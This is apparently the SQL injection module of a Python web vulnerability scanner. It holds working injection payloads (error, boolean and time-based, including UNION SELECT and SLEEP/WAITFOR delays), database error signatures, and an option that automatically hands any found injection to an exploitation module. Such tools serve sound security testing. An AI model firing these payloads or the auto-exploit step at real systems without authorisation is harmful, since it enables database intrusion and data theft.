"""
SQL 注入检测模块 — WebVulnScanner v6.0
Author: 火柴 | GitHub: huocai250

[优化] 集成自动利用：检测到注入后自动调用 SQLiExploiter
[优化] 改进时延基准采样
[优化] 统一使用 logging
"""
import logging
from core.logger import C as Colors
log = logging.getLogger("webscan")

import re
import time
from utils.http import extract_forms
from core.scanner import BaseScanner


ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL", r"Warning.*?mysql_", r"MySQLSyntaxErrorException",
    r"check the manual that (corresponds to|fits) your MySQL",
    r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server",
    r"SQLServer JDBC Driver", r"Incorrect syntax near",
    r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver",
    r"quoted string not properly terminated",
    r"PostgreSQL.*ERROR", r"Warning.*pg_", r"Npgsql\.",
    r"PG::SyntaxError", r"ERROR:\s+syntax error at or near",
    r"SQLite/JDBCDriver", r"SQLite\.Exception",
    r"Warning.*sqlite_", r"SQLITE_ERROR",
    r"Syntax error.*in query expression",
    r"Microsoft Access Driver",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    (" AND 1=1",      " AND 1=2"),
    ("' AND 1=1--",  "' AND 1=2--"),
]

TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:3'--",
    "' AND SLEEP(3)--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "1; SELECT pg_sleep(3)--",
]

ERROR_PAYLOADS = [
    "'", '"', "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 ORDER BY 1--",
    "1 ORDER BY 999--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
]

COMMON_PARAMS = ["id", "page", "q", "search", "keyword", "cat",
                 "item", "user", "uid", "pid", "cid", "type", "sort",
                 "order", "by", "name", "key", "value", "data"]


class SQLiScanner(BaseScanner):
    def run(self):
        _before = self.result.total()
        log.info("SQL 注入检测（报错/布尔/时延）...")
        r = self.get(self.target)
        self._baseline_time = self._sample_baseline()
        self._test_url_params()
        if r:
            for i, form in enumerate(extract_forms(r.text)):
                self._test_form(form, i)
        self._log_module_done("SQL注入", _before)

    def _sample_baseline(self) -> float:
        times = []
        for _ in range(3):
            t0 = time.time()
            self.get(self.target)
            times.append(time.time() - t0)
        return sum(times) / len(times) if times else 1.0

    def _test_url_params(self):
        for param in COMMON_PARAMS:
            if self._test_error_based(self.target, {param: "1"}, param, "GET"):
                continue
            if self._test_boolean_based(self.target, {param: "1"}, param, "GET"):
                continue
            self._test_time_based(self.target, {param: "1"}, param, "GET")

    def _test_form(self, form, idx):
        action = form["action"] or self.target
        if not action.startswith("http"):
            action = self.build_url(action)
        for param in form["inputs"]:
            if self._test_error_based(action, form["inputs"].copy(), param, form["method"]):
                return
            if self._test_boolean_based(action, form["inputs"].copy(), param, form["method"]):
                return
            self._test_time_based(action, form["inputs"].copy(), param, form["method"])

    def _test_error_based(self, url, params, param, method) -> bool:
        for payload in ERROR_PAYLOADS:
            test = params.copy()
            test[param] = str(params.get(param, "1")) + payload
            r = self._req(method, url, test)
            if r and self._has_sql_error(r.text):
                log.warning(f"[VULN][报错注入] 参数: {param} | Payload: {payload[:30]}")
                exploit_result = ""
                if self.exploit_mode:
                    exploit_result = self._run_exploit(url, param, method, params)
                self.result.add("SQL 注入", "CRITICAL",
                                f"[报错注入] 参数 '{param}' 存在 SQL 注入",
                                f"Payload: {payload}", url=url,
                                exploit_result=exploit_result)
                return True
        return False

    def _test_boolean_based(self, url, params, param, method) -> bool:
        orig_r = self._req(method, url, params)
        if not orig_r:
            return False
        orig_len = len(orig_r.text)
        for true_p, false_p in BOOLEAN_PAYLOADS:
            base_val = str(params.get(param, "1"))
            t = params.copy(); t[param] = base_val + true_p
            f = params.copy(); f[param] = base_val + false_p
            tr = self._req(method, url, t)
            fr = self._req(method, url, f)
            if not (tr and fr):
                continue
            if (abs(len(tr.text) - orig_len) < 30 and
                    abs(len(fr.text) - orig_len) > 80):
                log.warning(f"[VULN][布尔盲注] 参数: {param}")
                exploit_result = ""
                if self.exploit_mode:
                    exploit_result = self._run_exploit(url, param, method, params)
                self.result.add("SQL 注入", "HIGH",
                                f"[布尔盲注] 参数 '{param}' 疑似布尔盲注",
                                f"orig={orig_len} true={len(tr.text)} false={len(fr.text)}",
                                url=url, exploit_result=exploit_result)
                return True
        return False

    def _test_time_based(self, url, params, param, method) -> bool:
        threshold = max(self._baseline_time * 2 + 2.0, 3.0)
        for payload in TIME_PAYLOADS:
            test = params.copy()
            test[param] = str(params.get(param, "1")) + payload
            t0 = time.time()
            self._req(method, url, test)
            elapsed = time.time() - t0
            if elapsed >= threshold:
                log.warning(f"[VULN][时延盲注] 参数: {param} 响应 {elapsed:.1f}s")
                exploit_result = ""
                if self.exploit_mode:
                    exploit_result = self._run_exploit(url, param, method, params)
                self.result.add("SQL 注入", "HIGH",
                                f"[时延盲注] 参数 '{param}' (响应 {elapsed:.1f}s)",
                                f"Payload: {payload}", url=url,
                                exploit_result=exploit_result)
                return True
        return False

    def _run_exploit(self, url, param, method, base_params) -> str:
        """[新增] 调用利用模块"""
        try:
            from modules.exploit.sqli_exploit import SQLiExploiter
            exploiter = SQLiExploiter(self)
            info = exploiter.exploit(url, param, method, base_params)
            # 将详细利用结果存入 extra
            lines = []
            for k, v in info.items():
                if isinstance(v, (str, int, float)):
                    lines.append(f"{k}: {v}")
                elif isinstance(v, list):
                    lines.append(f"{k}: {', '.join(str(x) for x in v[:10])}")
                elif isinstance(v, dict):
                    for kk, vv in list(v.items())[:5]:
                        lines.append(f"  {kk}: {str(vv)[:100]}")
            return "\n".join(lines)
        except Exception as e:
            log.debug(f"SQLi 利用异常: {e}")
            return f"利用失败: {e}"

    def _req(self, method, url, params):
        if method == "POST":
            return self.post(url, data=params)
        return self.get(url, params=params)

    def _has_sql_error(self, text: str) -> bool:
        return any(re.search(p, text, re.I) for p in ERROR_PATTERNS)
